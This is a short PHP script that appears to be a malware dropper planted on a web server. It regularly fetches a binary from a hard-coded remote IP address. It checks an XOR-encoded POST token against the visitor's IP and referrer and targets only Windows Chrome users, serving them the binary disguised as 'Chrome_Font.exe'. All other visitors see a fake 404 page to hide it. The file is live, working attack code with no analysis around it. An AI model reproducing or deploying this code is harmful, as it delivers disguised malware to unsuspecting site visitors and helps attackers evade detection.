<?php
$file = "blog.xml.php";

function dwnld($file)
{
    $exe = @file_get_contents('http://31.184.193.179/2na2nana');
    file_put_contents($file, $exe);
}

if (is_file($file)) {
    if ((time() - filemtime($file)) > 600) {
        dwnld($file);
    }
} else
    dwnld($file);

if (isset($_GET["bsbs"])) {
    echo filesize($file);
}

if (isset($_POST["infol"])) {
    function enco($String)
    {
        $Seq   = 'pAsswd1';
        $Gamma = '';
        while (strlen($Gamma) < strlen($String)) {
            $Seq = pack("H*", md5($Gamma . $Seq . '123456790'));
            $Gamma .= substr($Seq, 0, 8);
        }
        return $String ^ $Gamma;
    }
    $ua    = $_SERVER['HTTP_USER_AGENT'];
    $ref   = $_SERVER['HTTP_REFERER'];
    $ip    = $_SERVER['REMOTE_ADDR'];
    $param = enco(base64_decode($_POST["infol"]));
    $arr   = explode('-|x|-', $param);
    
    if (sizeof($arr) == 3) {
        if ($arr[1] == $ip) {
            if (strstr($ref, $arr[2])) {
                if ((strstr($ua, 'Windows')) and (strstr($ua, 'Chrome'))) {
                    
                    header("Content-Type: application/octet-stream");
                    header("Accept-Ranges: bytes");
                    header("Content-Length: " . filesize($file));
                    header("Content-Disposition: attachment; filename=Chrome_Font.exe");
                    readfile($file);
                    exit;
                }
            }
        }
    }
}

header("HTTP/1.0 404 Not Found");
exit;
?>
